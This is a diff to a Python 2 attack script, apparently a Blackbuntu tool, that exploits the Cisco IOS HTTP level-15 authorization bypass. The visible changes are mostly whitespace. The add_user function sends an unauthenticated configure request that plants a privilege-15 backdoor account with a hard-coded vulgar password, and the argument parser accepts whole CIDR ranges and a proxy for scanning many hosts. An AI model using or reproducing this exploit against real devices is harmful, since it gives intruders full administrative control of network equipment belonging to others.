@@ -118,7 +118,7 @@ def Banner():
 *                                                                            *
 *----------------------------------------------------------------------------*
 *   Written by:                                                              *
-*            Krit Kadnok < c1ph3r@blackbuntu.com >                           *   
+*            Krit Kadnok < c1ph3r@blackbuntu.com >                           *
 *            Thanat Sirithawornsant <halloween@windowslive.com>              *
 *                                                                            *
 *   Visit: www.blackbuntu.com                                                *
@@ -275,13 +275,13 @@ def add_user(ip):
 	'''Add user to Cisco Device via IOS HTTP Vulnerabiltiy'''
 	try:
 		print "[+] Add user 'ciscoadm' with password 'teenslutfuckingciscorouter'"
-		print '[+] Send command',"username rtadmin privilege 15 secret hax0r",'to',ip
+		print '[+] Send command',"username ciscoadm privilege 15 secret teenslutfuckingciscorouter",'to',ip
 		command = "username ciscoadm privilege 15 secret teenslutfuckingciscorouter"
 		headers = {"Content-Type" : "application/x-www-form-urlencoded", "Content-Length" : 133}
 		params = urllib.urlencode({"command" : command, "command_url" : "/level/15/exec/-","new_command_url" : "/level/15/configure/-"})
 		h = httplib.HTTPConnection(ip)
 		h.request("POST", "/level/15/exec/-/configure/http", params, headers)
-		print "[+] Added user successfully!" 
+		print "[+] Added user successfully!"
 	except:
 		print "[-] Unable to add user"
 
@@ -291,7 +291,7 @@ if __name__ == "__main__":
 	try:
 		parser = argparse.ArgumentParser()
 		parser.add_argument('-t', '--target', action='store', dest='target',
-							help="""Target IP Address (Support both Single IP Address and 
+							help="""Target IP Address (Support both Single IP Address and
 							Variable Length Subnet Masking (VLSM CIDR) Ex. 192.168.0.1, 192.168.0.58/27)""")
 		parser.add_argument('-p', "--proxy", action='store', dest='proxy',
 							help='Use a HTTP proxy to connect to the target (ex. http://127.0.0.1:8080)')
@@ -309,11 +309,11 @@ if __name__ == "__main__":
 
 		#Banner()
 		current_dir = os.getcwd()
-		
+
 		if not os.path.exists(current_dir+'/config'):
 			try:
 				os.mkdir('config')
-			except Exception as e: 
+			except Exception as e:
 				pass
 
 		cisco_config_dir = current_dir+'/config/'
@@ -342,7 +342,7 @@ if __name__ == "__main__":
 			for ip in IPNetwork(options.target).iter_hosts():
 				ip = str(ip).strip()
 				sys.stdout.write('\b' * last_lenght)    # go back
-				sys.stdout.write(' ' * last_lenght)     # 
+				sys.stdout.write(' ' * last_lenght)     #
 				sys.stdout.write('\b' * last_lenght)    # reposition
 				sys.stdout.write(ip)
 				sys.stdout.flush()
